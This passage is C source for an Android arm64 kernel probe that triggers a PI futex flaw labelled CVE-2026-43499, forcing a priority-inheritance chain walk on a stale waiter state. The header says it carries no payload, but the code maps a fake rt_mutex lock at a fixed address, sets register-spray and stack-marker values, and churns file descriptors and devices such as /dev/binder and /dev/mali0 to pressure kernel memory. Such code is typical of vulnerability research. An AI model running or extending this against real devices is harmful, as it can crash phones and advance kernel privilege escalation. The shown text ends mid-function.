// SPDX-License-Identifier: GPL-3.0-or-later
// Copyright (C) 2026 yoyicue

/*
 * CVE-2026-43499 chain-walk probe for Android arm64.
 *
 * This is the next layer after cve_2026_43499_trigger_harness.c.
 *
 * Stage:
 *   1. Build the same three-thread PI futex cycle.
 *   2. Confirm FUTEX_CMP_REQUEUE_PI returns -EDEADLK.
 *   3. Let the waiter return from FUTEX_WAIT_REQUEUE_PI, leaving the vulnerable
 *      stale pi_blocked_on state on affected kernels.
 *   4. Either idle without a main-thread chain walk, or call
 *      FUTEX_LOCK_PI(cycle_futex) once to force a PI chain walk. One
 *      chain-walk mode first joins the waiter thread to test task lifetime.
 *
 * Safety boundary:
 *   - no payload;
 *   - no fake waiter;
 *   - no controlled stack reclaim;
 *   - optional waiter post-return syscall/FD churn is telemetry only;
 *   - no kernel write target setup.
 *
 * This can still panic or reboot a vulnerable test device. It is intentionally
 * separate from the EDEADLK staging harness and requires an explicit gate.
 */

#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <stddef.h>
#include <linux/audit.h>
#include <linux/filter.h>
#include <linux/futex.h>
#include <linux/seccomp.h>
#include <pthread.h>
#include <poll.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <limits.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <sys/epoll.h>
#include <sys/eventfd.h>
#include <sys/inotify.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/timerfd.h>
#include <sys/uio.h>
#include <sys/un.h>
#include <sys/utsname.h>
#include <time.h>
#include <unistd.h>

#ifndef SYS_futex
#define SYS_futex 98
#endif
#ifndef SYS_readv
#define SYS_readv 65
#endif
#ifndef SYS_preadv
#define SYS_preadv 69
#endif
#ifndef SYS_pwritev2
#define SYS_pwritev2 287
#endif
#ifndef SYS_process_vm_readv
#define SYS_process_vm_readv 270
#endif
#ifndef SYS_process_vm_writev
#define SYS_process_vm_writev 271
#endif
#ifndef SYS_sendmmsg
#define SYS_sendmmsg 269
#endif
#ifndef SYS_getcpu
#define SYS_getcpu 168
#endif
#ifndef SYS_tgkill
#define SYS_tgkill 131
#endif
#ifndef SYS_io_setup
#define SYS_io_setup 0
#endif
#ifndef SYS_io_submit
#define SYS_io_submit 2
#endif
#ifndef SYS_sched_setaffinity
#define SYS_sched_setaffinity 122
#endif
#ifndef SYS_sched_getaffinity
#define SYS_sched_getaffinity 123
#endif

#ifndef FUTEX_LOCK_PI
#define FUTEX_LOCK_PI 6
#endif
#ifndef FUTEX_UNLOCK_PI
#define FUTEX_UNLOCK_PI 7
#endif
#ifndef FUTEX_WAIT_REQUEUE_PI
#define FUTEX_WAIT_REQUEUE_PI 11
#endif
#ifndef FUTEX_CMP_REQUEUE_PI
#define FUTEX_CMP_REQUEUE_PI 12
#endif
#ifndef FUTEX_PRIVATE_FLAG
#define FUTEX_PRIVATE_FLAG 128
#endif
#ifndef FUTEX_WAIT
#define FUTEX_WAIT 0
#endif
#ifndef MFD_CLOEXEC
#define MFD_CLOEXEC 0x0001U
#endif
#ifndef MAP_FIXED_NOREPLACE
#define MAP_FIXED_NOREPLACE 0x100000
#endif
#ifndef PR_SET_NO_NEW_PRIVS
#define PR_SET_NO_NEW_PRIVS 38
#endif
#ifndef PR_SET_SECCOMP
#define PR_SET_SECCOMP 22
#endif
#ifndef SECCOMP_MODE_FILTER
#define SECCOMP_MODE_FILTER 2
#endif
#ifndef SECCOMP_RET_ALLOW
#define SECCOMP_RET_ALLOW 0x7fff0000U
#endif
#ifndef SECCOMP_RET_ERRNO
#define SECCOMP_RET_ERRNO 0x00050000U
#endif
#ifndef SECCOMP_RET_LOG
#define SECCOMP_RET_LOG 0x7ffc0000U
#endif
#ifndef SOCK_CLOEXEC
#define SOCK_CLOEXEC 02000000
#endif
#ifndef SOCK_NONBLOCK
#define SOCK_NONBLOCK 00004000
#endif

#define F_LOCK_PI (FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG)
#define F_UNLOCK_PI (FUTEX_UNLOCK_PI | FUTEX_PRIVATE_FLAG)
#define F_WAIT (FUTEX_WAIT | FUTEX_PRIVATE_FLAG)
#define F_WAIT_REQUEUE_PI (FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG)
#define F_CMP_REQUEUE_PI (FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG)
#define F_WAKE (FUTEX_WAKE | FUTEX_PRIVATE_FLAG)
#define SECCOMP_ERRNO_MARKER 0x05a5U
#define SECCOMP_ERRNO_ACTION (SECCOMP_RET_ERRNO | SECCOMP_ERRNO_MARKER)
#define SECCOMP_LOG_MARKER 0x05a5U
#define SECCOMP_LOG_ACTION (SECCOMP_RET_LOG | SECCOMP_LOG_MARKER)
#define SECCOMP_ALLOW_MARKER 0x05a5U
#define SECCOMP_ALLOW_MARKED_ACTION (SECCOMP_RET_ALLOW | SECCOMP_ALLOW_MARKER)
#define FIXED_FAKE_LOCK_DEFAULT_ADDR ((uintptr_t)0x000000007fff0000ULL)
#define FIXED_FAKE_LOCK_LEN 4096
#define SLOTSEARCH_PAGES 16
#define SLOTSEARCH_PAGE_SIZE 4096
#define CYCLE_FUTEX_REGION_LEN 4096

static uint32_t futex1;
static uint32_t futex2;
static uint32_t cycle_futex;
static uint32_t *cycle_futex_uaddr = &cycle_futex;

static int owner_ready;
static int waiter_ready;
static int owner_blocking;
static int waiter_waiting;
static int waiter_returned;
static int chainwalk_started;
static int finish_waiter;
static int owner_returned;
static int probe_done;
static int idle_control_mode;
static int waiter_exit_chainwalk_mode;
static int waiter_churn_started;
static int waiter_churn_done;
static int waiter_active_hold_started;

static long waiter_timeout_ms = 800;
static long waiter_hold_ms = 500;
static long idle_after_edeadlk_ms = 3000;
static long post_waiter_exit_delay_ms;
static long pre_chainwalk_delay_ms;
static long pre_chainwalk_delay_us;
static long watchdog_sec = 8;
static long waiter_churn_iterations;
static long waiter_churn_keep_fds;
static long process_vm_mb = 32;
static long waiter_churn_failures_seen;
static long waiter_churn_progress;
static long waiter_pressure_memfd_made;
static long waiter_pressure_pipe_made;
static long waiter_pressure_eventfd_made;
static long waiter_pressure_timerfd_made;
static long waiter_pressure_epoll_made;
static long waiter_pressure_inotify_made;
static long waiter_pressure_socketpair_made;
static long waiter_pressure_device_made;
static long waiter_pressure_bytes;
static int chainwalk_after_churn;
static int chainwalk_raw_final;
static int quiet_final;
static int quiet_waiter_churn;
static long chainwalk_raw_timeout_ms = 3000;
static uint64_t chainwalk_raw_val3;
static int map_fixed_fake_lock;
static int reuse_fixed_fake_lock_vma;
static int fixed_fake_lock_ready;
static uint64_t fixed_fake_lock_addr = FIXED_FAKE_LOCK_DEFAULT_ADDR;
static uintptr_t cycle_futex_fixed_addr;
static long cycle_futex_offset;
static long chainwalk_at_churn_iter;
static long stack_marker_telemetry_limit;
static uint64_t regspray_value = 0x0000000041410000ULL;
static uint64_t stacktag_value;
static uint64_t io_submit_word0 = 0x4349900000000000ULL;
static uint64_t io_submit_word1 = 0x4349900000000001ULL;
static long io_submit_opcode = 0x4349;
static long io_submit_reqprio;
static long io_submit_fd = -1;
static int io_submit_word0_set;
static int io_submit_word1_set;
static int waiter_adjust_pi_after_post_return;
static long waiter_adjust_pi_repeats = 1;
static int adjust_pi_start_isolated_hold;
static long waiter_tid_seen;
static int waiter_churn_progress_mode = 1;
static const char *waiter_churn_mode = "none";
static const char *waiter_post_return_mode = "normal";
static const char *waiter_isolated_hold_mode = "busy";
static const char *stackshape_case = "full";
static const char *frameprobe_case = "readlink";
static const char *main_final_shape = "none";
static const char *cycle_futex_mode = "global";
static char main_comm_marker[16];
static long waiter_futex_ret_seen;
static int waiter_futex_errno_seen;
static int waiter_post_return_probe_done;
static int waiter_post_return_probe_failures;
static long waiter_post_return_last_ret;
static int waiter_post_return_last_errno;
static long waiter_post_return_last_duration_us;
static long waiter_pipe_prime_read_ret;
static int waiter_pipe_prime_read_errno;
static long waiter_pipe_prime_write_ret;
static int waiter_pipe_prime_write_errno;

static int waiter_churn_fds[512];
static size_t waiter_churn_fd_count;
static void *slotsearch_region;
static size_t slotsearch_region_len;
static void *cycle_futex_region;
static uint32_t *waiter_isolated_hold_futex_tag;

static int slotsearch_init_region(void);
static int slotsearch_should_log(long iter);
static int frameprobe_case_is_blocking(void);
static long main_chainwalk_lock_pi(int *err_out, const char *label);

static long xfutex(uint32_t *uaddr, int op, uint32_t val, void *arg4,
                   uint32_t *uaddr2, uint32_t val3)
{
    errno = 0;
    return syscall(SYS_futex, uaddr, op, val, arg4, uaddr2, val3);
}

static long raw_syscall6(long nr,
                         uint64_t a0, uint64_t a1, uint64_t a2,
                         uint64_t a3, uint64_t a4, uint64_t a5)
{
#if defined(__aarch64__)
    register uint64_t x0 asm("x0") = a0;
    register uint64_t x1 asm("x1") = a1;
    register uint64_t x2 asm("x2") = a2;
    register uint64_t x3 asm("x3") = a3;
    register uint64_t x4 asm("x4") = a4;
    register uint64_t x5 asm("x5") = a5;
    register uint64_t x8 asm("x8") = (uint64_t)nr;

    asm volatile("svc #0"
                 : "+r"(x0)
                 : "r"(x1), "r"(x2), "r"(x3), "r"(x4), "r"(x5), "r"(x8)
                 : "memory", "cc");
    return (long)x0;
#else
    return syscall(nr, a0, a1, a2, a3, a4, a5);
#endif
}

static long gettid_long(void)
{
    return syscall(SYS_gettid);
}

static void cpu_relax_user(void)
{
#if defined(__aarch64__)
    asm volatile("yield" ::: "memory");
#elif defined(__arm__)
    asm volatile("yield" ::: "memory");
#else
    asm volatile("" ::: "memory");
#endif
}

static void busy_relax_for_hold_ms(long hold_ms)
{
    volatile unsigned long long spins = (unsigned long long)hold_ms * 100000ULL;

    while (spins-- > 0) {
        cpu_relax_user();
    }
}

static void add_ms_to_timespec(struct timespec *ts, long ms)
{
    ts->tv_sec += ms / 1000;
    ts->tv_nsec += (ms % 1000) * 1000000L;
    if (ts->tv_nsec >= 1000000000L) {
        ts->tv_sec++;
        ts->tv_nsec -= 1000000000L;
    }
}

static long ceil_div_long(long value, long divisor)
{
    return (value + divisor - 1) / divisor;
}

static uint32_t *cycle_futex_ptr(void)
{
    return cycle_futex_uaddr ? cycle_futex_uaddr : &cycle_futex;
}

static int cycle_futex_mode_is(const char *name)
{
    return strcmp(cycle_futex_mode, name) == 0;
}

static int cycle_futex_mode_valid(void)
{
    return cycle_futex_mode_is("global") ||
           cycle_futex_mode_is("mmap") ||
           cycle_futex_mode_is("fixed");
}

static int setup_cycle_futex_storage(void)
{
    uint8_t *base;
    void *mapped;
    int flags = MAP_PRIVATE | MAP_ANONYMOUS;

    if (cycle_futex_offset < 0 ||
        cycle_futex_offset > CYCLE_FUTEX_REGION_LEN - (long)sizeof(uint32_t) ||
        (cycle_futex_offset & 3) != 0) {
        fprintf(stderr,
                "cycle-futex-offset must be 4-byte aligned and within one page\n");
        return -1;
    }

    if (cycle_futex_mode_is("global")) {
        cycle_futex_uaddr = &cycle_futex;
        __atomic_store_n(cycle_futex_uaddr, 0, __ATOMIC_RELEASE);
        return 0;
    }

    if (cycle_futex_mode_is("fixed")) {
        if (cycle_futex_fixed_addr == 0 ||
            (cycle_futex_fixed_addr & (CYCLE_FUTEX_REGION_LEN - 1)) != 0) {
            fprintf(stderr,
                    "cycle-futex-fixed-addr must be nonzero and page aligned\n");
            return -1;
        }
        flags |= MAP_FIXED_NOREPLACE;
        mapped = mmap((void *)cycle_futex_fixed_addr, CYCLE_FUTEX_REGION_LEN,
                      PROT_READ | PROT_WRITE, flags, -1, 0);
    } else {
        mapped = mmap(NULL, CYCLE_FUTEX_REGION_LEN,
                      PROT_READ | PROT_WRITE, flags, -1, 0);
    }

    if (mapped == MAP_FAILED) {
        fprintf(stderr,
                "cycle_futex mmap mode=%s addr=0x%016llx failed errno=%d (%s)\n",
                cycle_futex_mode,
                (unsigned long long)cycle_futex_fixed_addr,
                errno, strerror(errno));
        return -1;
    }

    cycle_futex_region = mapped;
    memset(cycle_futex_region, 0, CYCLE_FUTEX_REGION_LEN);
    base = (uint8_t *)cycle_futex_region;
    cycle_futex_uaddr = (uint32_t *)(void *)(base + cycle_futex_offset);
    __atomic_store_n(cycle_futex_uaddr, 0, __ATOMIC_RELEASE);
    return 0;
}

static void print_cycle_futex_storage(void)
{
    printf("[cycle_futex] mode=%s region=%p len=%d offset=0x%lx uaddr=%p value=%u fixed_addr=0x%016llx global_uaddr=%p\n",
           cycle_futex_mode, cycle_futex_region, CYCLE_FUTEX_REGION_LEN,
           cycle_futex_offset, (void *)cycle_futex_ptr(),
           __atomic_load_n(cycle_futex_ptr(), __ATOMIC_RELAXED),
           (unsigned long long)cycle_futex_fixed_addr,
           (void *)&cycle_futex);
    fflush(stdout);
}

static void dump_maps_around_fixed_fake_lock(void)
{
    FILE *fp = fopen("/proc/self/maps", "r");
    char line[512];
    unsigned long long target = (unsigned long long)fixed_fake_lock_addr;
    unsigned long long low = target > 0x100000ULL ? target - 0x100000ULL : 0;
    unsigned long long high = target + 0x100000ULL;
    int found = 0;

    if (fp == NULL) {
        printf("[fixed_fake_lock] fopen /proc/self/maps failed errno=%d (%s)\n",
               errno, strerror(errno));
        fflush(stdout);
        return;
    }

    printf("[fixed_fake_lock] /proc/self/maps entries covering or within +/-0x100000 of 0x%016llx:\n",
           target);
    while (fgets(line, sizeof(line), fp) != NULL) {
        unsigned long long start;
        unsigned long long end;

        if (sscanf(line, "%llx-%llx", &start, &end) != 2) {
            continue;
        }
        if ((target >= start && target < end) ||
            (end > low && start < high)) {
            printf("[fixed_fake_lock][maps] %s", line);
            found = 1;
        }
    }
    fclose(fp);
    if (!found) {
        printf("[fixed_fake_lock] no nearby /proc/self/maps entries found\n");
    }
    fflush(stdout);
}

static void dump_smaps_for_fixed_fake_lock(void)
{
    FILE *fp = fopen("/proc/self/smaps", "r");
    char line[512];
    unsigned long long target = (unsigned long long)fixed_fake_lock_addr;
    int in_target = 0;
    int found = 0;

    if (fp == NULL) {
        printf("[fixed_fake_lock] fopen /proc/self/smaps failed errno=%d (%s)\n",
               errno, strerror(errno));
        fflush(stdout);
        return;
    }

    printf("[fixed_fake_lock] /proc/self/smaps entry covering 0x%016llx:\n",
           target);
    while (fgets(line, sizeof(line), fp) != NULL) {
        unsigned long long start;
        unsigned long long end;

        if (sscanf(line, "%llx-%llx", &start, &end) == 2) {
            if (in_target) {
                break;
            }
            in_target = target >= start && target < end;
            if (in_target) {
                found = 1;
                printf("[fixed_fake_lock][smaps] %s", line);
            }
            continue;
        }
        if (in_target &&
            (strncmp(line, "Size:", 5) == 0 ||
             strncmp(line, "KernelPageSize:", 15) == 0 ||
             strncmp(line, "MMUPageSize:", 12) == 0 ||
             strncmp(line, "Rss:", 4) == 0 ||
             strncmp(line, "Pss:", 4) == 0 ||
             strncmp(line, "Shared_Clean:", 13) == 0 ||
             strncmp(line, "Shared_Dirty:", 13) == 0 ||
             strncmp(line, "Private_Clean:", 14) == 0 ||
             strncmp(line, "Private_Dirty:", 14) == 0 ||
             strncmp(line, "Referenced:", 11) == 0 ||
             strncmp(line, "Anonymous:", 10) == 0 ||
             strncmp(line, "AnonHugePages:", 14) == 0 ||
             strncmp(line, "Swap:", 5) == 0 ||
             strncmp(line, "VmFlags:", 8) == 0)) {
            printf("[fixed_fake_lock][smaps] %s", line);
        }
    }
    fclose(fp);
    if (!found) {
        printf("[fixed_fake_lock] no covering /proc/self/smaps entry found\n");
    }
    fflush(stdout);
}

static void print_fixed_fake_lock_state(const char *tag)
{
    volatile uint32_t *wait_lock;
    volatile uint64_t *waiters_root;
    volatile uint64_t *waiters_leftmost;
    volatile uint64_t *owner;
    unsigned char vec = 0;
    void *want = (void *)(uintptr_t)fixed_fake_lock_addr;
    int mincore_rc;
    int mincore_errno = 0;

    if (!fixed_fake_lock_ready) {
        return;
    }

    mincore_rc = mincore(want, FIXED_FAKE_LOCK_LEN, &vec);
    if (mincore_rc != 0) {
        mincore_errno = errno;
    }

    wait_lock = (volatile uint32_t *)((uint8_t *)want + 0x00);
    waiters_root = (volatile uint64_t *)((uint8_t *)want + 0x08);
    waiters_leftmost = (volatile uint64_t *)((uint8_t *)want + 0x10);
    owner = (volatile uint64_t *)((uint8_t *)want + 0x18);

    printf("[fixed_fake_lock][%s] addr=%p mincore=%d vec=0x%02x errno=%d (%s) wait_lock@+0x00=0x%08x waiters_root@+0x08=0x%016llx waiters_leftmost@+0x10=0x%016llx owner@+0x18=0x%016llx\n",
           tag, want, mincore_rc, vec, mincore_errno,
           mincore_errno ? strerror(mincore_errno) : "OK",
           *wait_lock,
           (unsigned long long)*waiters_root,
           (unsigned long long)*waiters_leftmost,
           (unsigned long long)*owner);
    fflush(stdout);
}

static int setup_fixed_fake_lock_mapping(void)
{
    void *want = (void *)(uintptr_t)fixed_fake_lock_addr;
    void *p = mmap(want, FIXED_FAKE_LOCK_LEN, PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED_NOREPLACE, -1, 0);
    if (p == MAP_FAILED) {
        if (errno == EEXIST) {
            printf("[fixed_fake_lock] addr=%p already mapped (MAP_FIXED_NOREPLACE EEXIST)\n",
                   want);
            fflush(stdout);
            dump_maps_around_fixed_fake_lock();
            dump_smaps_for_fixed_fake_lock();
            if (!reuse_fixed_fake_lock_vma) {
                printf("[fixed_fake_lock] refusing to reuse existing VMA without --reuse-fixed-fake-lock-vma\n");
                fflush(stdout);
                return -1;
            }
            printf("[fixed_fake_lock] trying mprotect+reuse of existing VMA\n");
            fflush(stdout);
            if (mprotect(want, FIXED_FAKE_LOCK_LEN,
                         PROT_READ | PROT_WRITE) != 0) {
                printf("[fixed_fake_lock] mprotect existing addr=%p len=%d failed errno=%d (%s)\n",
                       want, FIXED_FAKE_LOCK_LEN, errno, strerror(errno));
                fflush(stdout);
                return -1;
            }
            p = want;
        } else {
            printf("[fixed_fake_lock] mmap addr=%p len=%d failed errno=%d (%s)\n",
                   want, FIXED_FAKE_LOCK_LEN, errno, strerror(errno));
            fflush(stdout);
            return -1;
        }
    }
    if (p != want) {
        printf("[fixed_fake_lock] mmap returned unexpected addr=%p want=%p\n",
               p, want);
        fflush(stdout);
        munmap(p, FIXED_FAKE_LOCK_LEN);
        return -1;
    }

    memset(p, 0, FIXED_FAKE_LOCK_LEN);

    uint32_t *wait_lock = (uint32_t *)((uint8_t *)p + 0x00);
    uint64_t *waiters_root = (uint64_t *)((uint8_t *)p + 0x08);
    uint64_t *waiters_leftmost = (uint64_t *)((uint8_t *)p + 0x10);
    uint64_t *owner = (uint64_t *)((uint8_t *)p + 0x18);

    *wait_lock = 0;
    *waiters_root = 0;
    *waiters_leftmost = 0;
    *owner = 0;

    if (mlock(p, FIXED_FAKE_LOCK_LEN) == 0) {
        printf("[fixed_fake_lock] mlock addr=%p len=%d OK\n",
               p, FIXED_FAKE_LOCK_LEN);
    } else {
        printf("[fixed_fake_lock] mlock addr=%p len=%d failed errno=%d (%s)\n",
               p, FIXED_FAKE_LOCK_LEN, errno, strerror(errno));
    }
    fixed_fake_lock_ready = 1;
    printf("[fixed_fake_lock] mapped addr=%p len=%d wait_lock@+0x00=0x%08x waiters_root@+0x08=0x%016llx waiters_leftmost@+0x10=0x%016llx owner@+0x18=0x%016llx\n",
           p, FIXED_FAKE_LOCK_LEN, *wait_lock,
           (unsigned long long)*waiters_root,
           (unsigned long long)*waiters_leftmost,
           (unsigned long long)*owner);
    print_fixed_fake_lock_state("after_setup");
    fflush(stdout);
    return 0;
}

static void print_ret(const char *tag, long ret, int err)
{
    if (ret == -1) {
        printf("%s ret=%ld errno=%d (%s)\n", tag, ret, err, strerror(err));
    } else {
        printf("%s ret=%ld errno=0 (OK)\n", tag, ret);
    }
    fflush(stdout);
}

static void waiter_churn_keep_fd(int fd)
{
    if (fd < 0) {
        return;
    }
    if (waiter_churn_fd_count < (size_t)waiter_churn_keep_fds &&
        waiter_churn_fd_count < sizeof(waiter_churn_fds) / sizeof(waiter_churn_fds[0])) {
        waiter_churn_fds[waiter_churn_fd_count++] = fd;
    } else {
        close(fd);
    }
}

static int waiter_churn_remember_fd_no_close(int fd)
{
    if (fd < 0) {
        return -1;
    }
    if (waiter_churn_fd_count >=
        sizeof(waiter_churn_fds) / sizeof(waiter_churn_fds[0])) {
        errno = EMFILE;
        return -1;
    }
    waiter_churn_fds[waiter_churn_fd_count++] = fd;
    return 0;
}

static void waiter_churn_close_fds(void)
{
    for (size_t i = 0; i < waiter_churn_fd_count; i++) {
        close(waiter_churn_fds[i]);
    }
    waiter_churn_fd_count = 0;
}

static int waiter_churn_make_pipe(void)
{
    int fds[2] = {-1, -1};
    if (pipe2(fds, O_CLOEXEC | O_NONBLOCK) != 0) {
        return -1;
    }
    waiter_churn_keep_fd(fds[0]);
    waiter_churn_keep_fd(fds[1]);
    return 0;
}

static int waiter_churn_make_eventfd(void)
{
    int fd = eventfd(0, EFD_CLOEXEC | EFD_NONBLOCK);
    if (fd < 0) {
        return -1;
    }
    waiter_churn_keep_fd(fd);
    return 0;
}

static int waiter_churn_make_timerfd(void)
{
    int fd = timerfd_create(CLOCK_MONOTONIC, TFD_CLOEXEC | TFD_NONBLOCK);
    if (fd < 0) {
        return -1;
    }
    waiter_churn_keep_fd(fd);
    return 0;
}

static int waiter_churn_make_epoll(void)
{
    int fd = epoll_create1(EPOLL_CLOEXEC);
    if (fd < 0) {
        return -1;
    }
    waiter_churn_keep_fd(fd);
    return 0;
}

static int waiter_churn_make_socketpair(void)
{
    int fds[2] = {-1, -1};
    if (socketpair(AF_UNIX, SOCK_DGRAM | SOCK_CLOEXEC | SOCK_NONBLOCK, 0, fds) != 0) {
        return -1;
    }
    waiter_churn_keep_fd(fds[0]);
    waiter_churn_keep_fd(fds[1]);
    return 0;
}

static int waiter_churn_make_memfd(void)
{
#ifdef SYS_memfd_create
    int fd = (int)syscall(SYS_memfd_create, "cve43499_waiter_churn", MFD_CLOEXEC);
    if (fd < 0) {
        return -1;
    }
    if (ftruncate(fd, 4096) != 0) {
        int saved_errno = errno;
        close(fd);
        errno = saved_errno;
        return -1;
    }
    void *p = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (p == MAP_FAILED) {
        int saved_errno = errno;
        close(fd);
        errno = saved_errno;
        return -1;
    }
    memset(p, 0x57, 4096);
    munmap(p, 4096);
    waiter_churn_keep_fd(fd);
    return 0;
#else
    errno = ENOSYS;
    return -1;
#endif
}

static int waiter_churn_make_pipe_pressure(void)
{
    char buf[1024];
    int fds[2] = {-1, -1};

    memset(buf, 0x42, sizeof(buf));
    if (pipe2(fds, O_CLOEXEC | O_NONBLOCK) != 0) {
        return -1;
    }
    if (write(fds[1], buf, sizeof(buf)) > 0) {
        __atomic_add_fetch(&waiter_pressure_bytes, (long)sizeof(buf),
                           __ATOMIC_RELEASE);
    }
    waiter_churn_keep_fd(fds[0]);
    waiter_churn_keep_fd(fds[1]);
    __atomic_add_fetch(&waiter_pressure_pipe_made, 1, __ATOMIC_RELEASE);
    return 0;
}

static int waiter_churn_make_eventfd_pressure(void)
{
    uint64_t one = 1;
    int fd = eventfd(0, EFD_CLOEXEC | EFD_NONBLOCK);
    if (fd < 0) {
        return -1;
    }
    if (write(fd, &one, sizeof(one)) == (ssize_t)sizeof(one)) {
        __atomic_add_fetch(&waiter_pressure_bytes, (long)sizeof(one),
                           __ATOMIC_RELEASE);
    }
    waiter_churn_keep_fd(fd);
    __atomic_add_fetch(&waiter_pressure_eventfd_made, 1, __ATOMIC_RELEASE);
    return 0;
}

static int waiter_churn_make_epoll_pressure(void)
{
    int epfd = epoll_create1(EPOLL_CLOEXEC);
    int evfd;
    struct epoll_event ev;

    if (epfd < 0) {
        return -1;
    }
    evfd = eventfd(0, EFD_CLOEXEC | EFD_NONBLOCK);
    if (evfd < 0) {
        int saved_errno = errno;
        close(epfd);
        errno = saved_errno;
        return -1;
    }
    memset(&ev, 0, sizeof(ev));
    ev.events = EPOLLIN;
    ev.data.u64 = (uint64_t)(uintptr_t)&waiter_pressure_epoll_made;
    if (epoll_ctl(epfd, EPOLL_CTL_ADD, evfd, &ev) != 0) {
        int saved_errno = errno;
        close(epfd);
        close(evfd);
        errno = saved_errno;
        return -1;
    }
    waiter_churn_keep_fd(epfd);
    waiter_churn_keep_fd(evfd);
    __atomic_add_fetch(&waiter_pressure_epoll_made, 1, __ATOMIC_RELEASE);
    return 0;
}

static int waiter_churn_make_inotify_pressure(void)
{
    int fd = inotify_init1(IN_CLOEXEC | IN_NONBLOCK);
    if (fd < 0) {
        return -1;
    }
    if (inotify_add_watch(fd, "/proc/self/status", IN_ACCESS | IN_ATTRIB) < 0) {
        int saved_errno = errno;
        close(fd);
        errno = saved_errno;
        return -1;
    }
    waiter_churn_keep_fd(fd);
    __atomic_add_fetch(&waiter_pressure_inotify_made, 1, __ATOMIC_RELEASE);
    return 0;
}

static int waiter_churn_make_socketpair_pressure(void)
{
    char buf[512];
    int fds[2] = {-1, -1};

    memset(buf, 0x43, sizeof(buf));
    if (socketpair(AF_UNIX, SOCK_DGRAM | SOCK_CLOEXEC | SOCK_NONBLOCK, 0, fds) != 0) {
        return -1;
    }
    if (send(fds[0], buf, sizeof(buf), MSG_DONTWAIT) > 0) {
        __atomic_add_fetch(&waiter_pressure_bytes, (long)sizeof(buf),
                           __ATOMIC_RELEASE);
    }
    waiter_churn_keep_fd(fds[0]);
    waiter_churn_keep_fd(fds[1]);
    __atomic_add_fetch(&waiter_pressure_socketpair_made, 1, __ATOMIC_RELEASE);
    return 0;
}

static int waiter_churn_make_unix_queue_pressure(void)
{
    char buf[512];
    int fds[2] = {-1, -1};
    long bytes = 0;

    memset(buf, 0x55, sizeof(buf));
    if (socketpair(AF_UNIX, SOCK_DGRAM | SOCK_CLOEXEC | SOCK_NONBLOCK, 0, fds) != 0) {
        return -1;
    }
    for (int i = 0; i < 4; i++) {
        ssize_t n = send(fds[0], buf, sizeof(buf), MSG_DONTWAIT);
        if (n < 0) {
            int saved_errno = errno;
            close(fds[0]);
            close(fds[1]);
            errno = saved_errno;
            return -1;
        }
        bytes += n;
    }
    waiter_churn_keep_fd(fds[0]);
    waiter_churn_keep_fd(fds[1]);
    __atomic_add_fetch(&waiter_pressure_socketpair_made, 1, __ATOMIC_RELEASE);
    __atomic_add_fetch(&waiter_pressure_bytes, bytes, __ATOMIC_RELEASE);
    return 0;
}

static int waiter_churn_make_memfd_pressure(void)
{
    int rc = waiter_churn_make_memfd();
    if (rc == 0) {
        __atomic_add_fetch(&waiter_pressure_memfd_made, 1, __ATOMIC_RELEASE);
        __atomic_add_fetch(&waiter_pressure_bytes, 4096, __ATOMIC_RELEASE);
    }
    return rc;
}

static int waiter_churn_open_pressure_device(long iter)
{
    static const char *const paths[] = {
        "/dev/apusys",
        "/dev/binder",
        "/dev/hwbinder",
        "/dev/mali0",
        "/proc/ged",
    };
    const char *path = paths[iter % (long)(sizeof(paths) / sizeof(paths[0]))];
    int fd = open(path, O_RDWR | O_NONBLOCK | O_CLOEXEC);
    if (fd < 0 && strcmp(path, "/proc/ged") == 0) {
        fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
    }
    if (fd < 0) {
        return -1;
    }
    waiter_churn_keep_fd(fd);
    __atomic_add_fetch(&waiter_pressure_device_made, 1, __ATOMIC_RELEASE);
    return 0;
}

static int waiter_churn_pressure_bundle(long iter)
{
    int failures = 0;

    if (waiter_churn_make_memfd_pressure() != 0) failures++;
    if (waiter_churn_make_pipe_pressure() != 0) failures++;
    if (waiter_churn_make_eventfd_pressure() != 0) failures++;
    if (waiter_churn_make_timerfd() != 0) {
        failures++;
    } else {
        __atomic_add_fetch(&waiter_pressure_timerfd_made, 1, __ATOMIC_RELEASE);
    }
    if (waiter_churn_make_epoll_pressure() != 0) failures++;
    if (waiter_churn_make_inotify_pressure() != 0) failures++;
    if (waiter_churn_make_socketpair_pressure() != 0) failures++;
    if ((iter % 3) == 0 && waiter_churn_open_pressure_device(iter) != 0) {
        failures++;
    }

    return failures == 0 ? 0 : -1;
}

static int stack_marker_telemetry_should_log(long iter)
{
    if (stack_marker_telemetry_limit <= 0) {
        return 0;
    }
    if (iter < stack_marker_telemetry_limit) {
        return 1;
    }
    if (chainwalk_at_churn_iter > 0 &&
        iter + 1 == chainwalk_at_churn_iter) {
        return 1;
    }
    return waiter_churn_iterations > 0 && iter + 1 == waiter_churn_iterations;
}

static void print_stack_marker_telemetry(const char *when, long iter,
                                         const volatile uint64_t *marker,
                                         const void *buf,
                                         const void *msgbuf,
                                         const void *failures_addr)
{
    uint64_t marker0 = marker[0];
    uint64_t marker31 = marker[31];
    uint64_t buf0 = 0;
    uint64_t msg0 = 0;

    memcpy(&buf0, buf, sizeof(buf0));
    memcpy(&msg0, msgbuf, sizeof(msg0));
    printf("[W] stack_marker when=%s iter=%ld tid=%ld case=%s marker=%p marker0=0x%016llx marker31=0x%016llx buf=%p buf0=0x%016llx msgbuf=%p msg0=0x%016llx failures_addr=%p\n",
           when, iter, gettid_long(), stackshape_case, (const void *)marker,
           (unsigned long long)marker0, (unsigned long long)marker31,
           buf, (unsigned long long)buf0, msgbuf,
           (unsigned long long)msg0, failures_addr);
    fflush(stdout);
}

static int stackshape_case_is(const char *name)
{
    return strcmp(stackshape_case, name) == 0;
}

static int stackshape_case_is_tagged(void)
{
    return strncmp(stackshape_case, "tag-", 4) == 0;
}

static int stackshape_case_is_stacktag(void)
{
    return strncmp(stackshape_case, "stacktag-", 9) == 0;
}

static int stackshape_case_valid(void)
{
    return stackshape_case_is("full") ||
